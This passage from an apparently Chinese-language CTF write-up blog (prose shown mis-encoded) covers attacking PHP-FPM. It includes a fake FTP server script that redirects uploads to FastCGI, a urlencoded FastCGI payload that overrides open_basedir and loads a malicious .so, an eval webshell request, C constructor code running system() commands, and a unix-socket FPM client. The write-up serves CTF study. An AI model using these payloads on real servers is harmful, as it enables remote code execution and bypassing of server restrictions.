&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$errstr&lt;/span>&lt;span style="color:#d88200"> (&lt;/span>&lt;span style="color:#d88200">$errno&lt;/span>&lt;span style="color:#d88200">)&amp;lt;br /&amp;gt;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_accept&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;210 Fake FTP&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// USER
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;230 Login successful&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// TYPE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;200 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// SIZE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;550 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// EPSV
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;500 wtf&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// PASV
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// $ip = &amp;#39;192.168.1.4&amp;#39;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">11451&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$porth&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">floor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$portl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;227 Entering Passive Mode. &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ip&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;,&lt;/span>&lt;span style="color:#d88200">$porth&lt;/span>&lt;span style="color:#d88200">,&lt;/span>&lt;span style="color:#d88200">$portl\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// STOR
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;125 GOGOGO!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">sleep&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;226 Thanks!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>urlencodeä¹‹åä¼ å…¥ï¼Œå†æ‰«ä¸€ä¸‹ç«¯å£å¯ä»¥çœ‹åˆ°46819å¼€æ”¾ï¼Œè¯´æ˜æœåŠ¡æ­£å¸¸ï¼›è¿˜æ˜¯ç”¨ä¹‹å‰pç‰›çš„è„šæœ¬æ„é€ ï¼Œè¿™é‡Œæˆ‘ä»¬è¦ä¿®æ”¹çš„é…ç½®é¡¹æ˜¯è¿™äº›&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On\nopen_basedir = /\nextension = /tmp/wuhu.so&amp;#39;,
&lt;/code>&lt;/pre>&lt;p>è¦†ç›–æ‰open_basedirçš„åŸæœ‰è®¾ç½®ï¼Œå†åŠ ä¸Š.soæ–‡ä»¶ï¼ˆç¨åä¸Šä¼ ï¼‰ï¼›å…·ä½“çš„payloadä¹Ÿå¯ä»¥ç”¨pç‰›çš„è„šæœ¬é­”æ”¹ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211113011624783.png" alt="image-20211113011624783">&lt;/p>
&lt;p>æ³¨é‡Šæ‰157-159å¯¹è¿æ¥çŠ¶æ€çš„åˆ¤æ–­ï¼Œåœ¨191åˆ›å»ºè¿æ¥å‰å°†requestéƒ¨åˆ†ç›´æ¥è¾“å‡ºurlencodeçš„ç‰ˆæœ¬ç„¶åexit(0)ä¸€æ³¢é€€å‡º&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python fpm.py 127.0.0.1 &lt;span style="color:#d88200">&amp;#39;/var/www/html/index.php&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>%01%01Mp%00%08%00%00%00%01%00%00%00%00%00%00%01%04Mp%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04Mp%00%00%00%00%01%05Mp%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05Mp%00%00%00%00
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST: a=$payload=urldecode(&amp;#39;%01%01%29%BE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%29%BE%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04%29%BE%00%00%00%00%01%05%29%BE%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05%29%BE%00%00%00%00&amp;#39;);var_dump(file_put_contents(&amp;#39;ftp://127.0.0.1:46819/wuhu&amp;#39;,$payload));
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114223615660.png" alt="image-20211114223615660">&lt;/p>
&lt;p>å†™æ¶æ„.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ls / -al &amp;gt; /tmp/p1.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;find / -perm -4000 2&amp;gt;/tmp/p2.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat /flag &amp;gt; /tmp/p3.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼ .so&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST:
a=var_dump(file_put_contents(&amp;#39;/tmp/wuhu.so&amp;#39;,$_POST[&amp;#39;data&amp;#39;]));&amp;amp;data=xxxxxxxxxxxxxxxxxxx
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114224351897.png" alt="image-20211114224351897">&lt;/p>
&lt;p>è¯•ç€æ‰§è¡Œä¸€ä¸‹å‘½ä»¤ï¼ŒæˆåŠŸè§£é™¤open_basedirçš„é™åˆ¶&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114231135348.png" alt="image-20211114231135348">&lt;/p>
&lt;p>ä½†æ˜¯ä¸€æ ·çš„æ“ä½œä¹‹åå°±æ‰§è¡Œä¸äº†äº†â€¦â€¦å°±ä¸Šé¢è¿™ä¸ªé¡µé¢ï¼Œå°±æ­£å¸¸å‡ºæ¥äº†ç¬¬ä¸€æ¬¡ï¼Œç„¶åå°±ä¸è¡Œäº†ï¼Œéå¸¸çš„ç¦»è°±å•Šå•Šå•Šå•Šå•Š&lt;/p>
&lt;p>æ­£å¸¸æ¥è¯´ï¼Œåªæœ‰open_basedirè¢«è§£æ”¾åæ‰å¯ä»¥scandir(&amp;rsquo;/&amp;rsquo;)ï¼ˆæ²¡æœ‰çš„è¯æ˜¯åªå¯ä»¥scandir(&amp;rsquo;/var/www/html&amp;rsquo;)ï¼‰ï¼Œè€Œæ—¢ç„¶è¿™æ ·å¯ä»¥æ‰§è¡ŒæˆåŠŸå°±è¯´æ˜å¼€å§‹çš„fpmæµé‡ä¸€å®šè¢«æ­£å¸¸æ‰“å‡ºå»äº†ï¼Œå†åŠ ä¸Š.soä¹Ÿè¢«å†™å…¥ï¼ˆæˆ‘åˆ°dockerä¸Šçœ‹äº†ï¼‰ï¼Œé‚£ä¹ˆ.soä¸€å®šä¼šåœ¨phpæ‰§è¡Œæ—¶è¢«è§¦å‘ï¼Œä¸€å®šæ˜¯å¯ä»¥æ‰§è¡Œ.soä¸­æˆ‘ä»¬å†™çš„å‘½ä»¤çš„ï¼›ä½†æ˜¯ç°åœ¨ç«Ÿç„¶è¿scandir(&amp;rsquo;/&amp;rsquo;)éƒ½åªèƒ½æ‰§è¡Œä¸€æ¬¡ ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿåé¢å°±éƒ½å¤±è´¥äº†ï¼Œæ›´ä¸è¦è¯´.soä¸­çš„å‘½ä»¤äº†ï¼Œè‚¯å®šæ›´æ˜¯æ²¡æœ‰æ‰§è¡Œ&lt;/p>
&lt;p>ä¹‹ååˆå°è¯•äº†å¾ˆå¤šæ¬¡ï¼Œ.soæ­£å¸¸ä¸Šä¼ ï¼Œæœ€å¼€å§‹æ‰“å‘fpmçš„æµé‡ä¹Ÿåˆæ‰“äº†å‡ éï¼Œå¤±è´¥ï¼›å†ä¹‹å.soä¹Ÿä¸èƒ½æ­£å¸¸ä¸Šä¼ äº†ï¼Œæœ€åˆçš„é‚£ä¸ªæµé‡ä¹Ÿæ‰“ä¸æˆäº†ï¼Œåªèƒ½å›æ˜¾int(xxx)ï¼Œä½†æ˜¯æ²¡æœ‰eval()çš„å›æ˜¾ï¼Œè¯´æ˜è¿˜æ˜¯ä¸æ­£å¸¸ï¼Œç„¶åä»–å¦ˆçš„ï¼Œé—´æˆ–æœ‰ä¸€ä¸¤æ¬¡èƒ½æˆåŠŸï¼Œç”šè‡³æˆ‘éƒ½åˆåœ¨/tmpç›®å½•ä¸‹å†™äº†åˆ«çš„æ–‡ä»¶ï¼ˆå¦‚æœå‰é¢çš„æµé‡æ²¡æ­£å¸¸æ‰“å‡ºå»çš„è¯æ˜¯ç»å¯¹ä¸å¯èƒ½åšåˆ°çš„ï¼Œè‚¯å®šæ˜¯bool(false)ï¼‰ï¼Œä½†æ˜¯ä½†æ˜¯ä½†æ˜¯åˆæ˜¯ä¸€ç§’ç ´åŠŸï¼ŒçœŸæ˜¯ä¸ç†è§£äº†ï¼Œå®Œå…¨æ˜¯è·Ÿå‰é¢ä¸€æ¨¡ä¸€æ ·çš„payloadï¼Œä½†æ˜¯å°±ä»–å¦ˆç„å­¦ï¼Œåäº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115014616324.png" alt="image-20211115014616324">&lt;/p>
&lt;p>ä¸æƒ³å†è€—å¤ªå¤šæ—¶é—´åœ¨è¿™ä¸ªé¢˜ä¸Šäº†ï¼Œå®åœ¨æ˜¯ç»·ä¸ä½äº†ï¼ˆè°ƒäº†å¿«1å¤©äº†ï¼‰ï¼ŒåŸºæœ¬ä¹Ÿç®—æ˜¯æ‰“é€šäº†ï¼ˆæ¯•ç«Ÿå°±å·®ä¸€ç‚¹ç‚¹å•Šå•Šå•Šå•Šå•Š æˆ‘æˆªå›¾è¿˜æœ‰å‘¢ï¼‰ï¼ˆå…¶å®æ˜¯æ‡’çš„é‡ç½®dockerå†å°è¯•äº† æˆ‘çš„ï¼‰ï¼Œæˆ‘çŒœæµ‹å‡ºé”™çš„ç‚¹åœ¨äºé‚£ä¸ªå¼€åœ¨46819ç«¯å£çš„ftpæœåŠ¡å™¨ä¸ç¨³å®šï¼Œå®ƒåœ¨å¤„ç†è¿™è¾¹ftpæ‰“å‡ºçš„æµé‡æ—¶å¯èƒ½æ²¡æœ‰æ­£å¸¸çš„å¤„ç†ï¼Œå†åŠ ä¸Šæ¥å›è°ƒæ•´payloadæ‰“äº†å¤ªå¤šæ¬¡äº†ï¼Œå¯èƒ½ä¹‹å‰çš„é”™è¯¯ç´¯ç§¯åˆ°åé¢ï¼Œæ¯”å¦‚æŸæ¬¡æ²¡æœ‰urlencodeä¹‹ç±»çš„ï¼Œæå¾—ç¯å¢ƒä¹Ÿä¸æ­£å¸¸äº†&lt;/p>
&lt;h4 id="è“å¸½æ¯-2021one-pointer-php">***[è“å¸½æ¯ 2021]One Pointer PHP&lt;/h4>
&lt;hr>
&lt;p>yysyï¼Œç¡®å®æ²¡æ—¶é—´å¤ç°ï¼ˆå¤ç°èµµæ€»çš„é¢˜è®©æˆ‘æœ‰å¿ƒç†é˜´å½±äº†ï¼‰&lt;/p>
&lt;p>æˆ‘å°±å…ˆäº‘ä¸€ä¸‹ï¼Œå¯¹8èµ·&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="http://www.yang99.top/index.php/archives/52/">wp1&lt;/a> | &lt;a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">wp2&lt;/a>&lt;/p>
&lt;h3 id="æ”»å‡»unix-socketæ¨¡å¼ä¸‹çš„php-fpm">æ”»å‡»unix socketæ¨¡å¼ä¸‹çš„php-fpm&lt;/h3>
&lt;p>ç”±äºunix socketæ˜¯è¯»å–/run/php/php7.4-fpm.sockè¿›è¡Œå†…éƒ¨é€šä¿¡ï¼Œé‚£å¿…ç„¶æ˜¯ä¸èƒ½æ‰“è¿œç¨‹ï¼Œç”¨çš„æ˜¯&lt;code>stream_socket_client&lt;/code>å»ºç«‹ä¸€ä¸ªunix socketè¿æ¥ï¼Œç„¶åå†™å…¥tcpæµæ¥é€šä¿¡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_client&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unix:///run/php/php7.3-fpm.sock&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">fputs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">]));&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="ctf-2019echohub">[*CTF 2019]Echohub&lt;/h4>
&lt;p>å‰é¢çš„pwnéƒ¨åˆ†æˆ‘æ˜¯ä¸å¤ªèƒ½çœ‹æ‡‚ï¼ˆè‡³å°‘ç›®å‰ï¼‰ï¼Œå°±ç®€å•è¯´è¯´åé¢çš„webéƒ¨åˆ†ï¼›&lt;a href="https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Echohub">è¿™é‡Œæ˜¯å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>ä»phpinfoå¯ä»¥çœ‹åˆ°disable_functions&lt;/p>
